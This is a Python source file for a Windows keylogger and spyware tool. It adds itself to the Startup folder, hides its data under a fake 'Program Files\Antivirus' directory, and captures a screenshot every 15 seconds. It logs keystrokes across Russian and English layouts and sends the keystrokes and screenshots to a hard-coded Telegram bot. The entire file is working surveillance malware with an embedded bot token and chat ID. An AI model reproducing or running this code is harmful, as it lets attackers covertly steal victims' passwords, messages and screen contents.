
from pynput import keyboard 
from pynput.keyboard import Key, KeyCode, Listener
import time
import telebot
from threading import *
import ctypes
import os, sys
import pyautogui
import getpass

def hide():
    import win32console, win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True

win_patch = (os.path.abspath(os.sep))#C:\
win_patch = win_patch[:2]

USER_NAME = getpass.getuser()

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
        file_path +="\\"+os.path.basename(__file__)[:-2]+"exe"
    bat_path =win_patch+r'\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)


add_to_startup()

#hide()

bot = telebot.TeleBot('5627738264:AAHY2AqQ4u1VMNzbfVFNYAYT08bOPFEOEuw')
MyNums = ['302620163']
log = ''


print(win_patch)
final_patch = win_patch+"\Program Files\Antivirus"
final_patch2 = win_patch+"/Program Files/Antivirus"

if not os.path.exists(final_patch):
    os.makedirs(final_patch2)

if os.path.exists(final_patch2+"/log"):
    sys.exit(0)

def Multi_app_disabler():
    os.makedirs(final_patch2+"/log")    

Multi_app_disabler()
def screenshot():
    while True:

        myscreenshot= pyautogui.screenshot()
        myscreenshot.save(final_patch+"\screen.png")
        img = open('C:/Program Files/Antivirus/screen.png','rb')
        bot.send_photo(MyNums,img)
        time.sleep(15)





t3 = Thread(target=screenshot, args = ())
t3.start()






translationEnRu = str.maketrans(dict(zip("""qwertyuiopQWERTYUIOP[{]}asdfghjklASDFGHJKL;':"zxcvbnmZXCVBNM,./<>?@#$^&`~""","""йцукенгшщзЙЦУКЕНГШЩЗхХъЪфывапролдФЫВАПРОЛДжэЖЭячсмитьЯЧСМИТЬбю.БЮ,"№;:?ёЁ""")))
translationRuEn = str.maketrans(dict(zip("""йцукенгшщзЙЦУКЕНГШЩЗхХъЪфывапролдФЫВАПРОЛДжэЖЭячсмитьЯЧСМИТЬбю.БЮ,"№;:?ёЁ""","""qwertyuiopQWERTYUIOP[{]}asdfghjklASDFGHJKL;':"zxcvbnmZXCVBNM,./<>?@#$^&`~""")))


pressed_vks = set()

def get_vk(key):
    return key.vk if hasattr(key, 'vk') else key.value.vk


def is_combination_pressed(combination):
    return all([get_vk(key) in pressed_vks for key in combination])







def get_layout():
    u = ctypes.windll.LoadLibrary("user32.dll")
    pf = getattr(u, "GetKeyboardLayout")
    if hex(pf(0)) == '0x4190419':
        return 'ru'
    if hex(pf(0)) == '0x4090409':
        return 'en'

start_leng = get_layout()
print(start_leng)
now_leng = start_leng

def leng_swipe():
    global now_leng
    if now_leng=='ru':
        now_leng='en'
    else:
        now_leng='ru'
    print(now_leng)



def Sender_tele(log):
    for i in MyNums:
        try:
            bot.send_message(i,log)
        except:
            print("Error: Send mes")


def process_key_pressss(key):
    global log
    global translationEnRu
    global translationRuEn
    vk = get_vk(key) 
    pressed_vks.add(vk)

    for combination in combination_to_function:  
        if is_combination_pressed(combination):  
            combination_to_function[combination]()

    Mykey = str(key)
    if len(Mykey)==3:
        Mykey = Mykey[1]
    
        if now_leng != start_leng and now_leng=='ru' and Mykey != 'Key.shift' and Mykey != 'Key.alt_l':
            Mykey = Mykey.translate(translationEnRu)
        elif now_leng != start_leng and now_leng=='en' and Mykey != 'Key.shift' and Mykey != 'Key.alt_l':
            Mykey = Mykey.translate(translationRuEn)
    print(Mykey)
    if Mykey== 'Key.space':
        Mykey= ' '
    
    elif len(Mykey)!=1:
        Mykey = f'({Mykey[4:]})'
    print(Mykey)
    log +=Mykey
    if len(log) >= 30:
        t1 = Thread(target=Sender_tele, args = (log,))
        t1.start()
        log = ''




combination_to_function = {
    frozenset([Key.alt_l, Key.shift]): leng_swipe,
}


def on_release(key):
    try:
        vk = get_vk(key) 
        pressed_vks.remove(vk)  
    except:
        pass

keyboard_listener = keyboard.Listener(on_press=process_key_pressss, on_release=on_release)

with keyboard_listener:
    keyboard_listener.join()


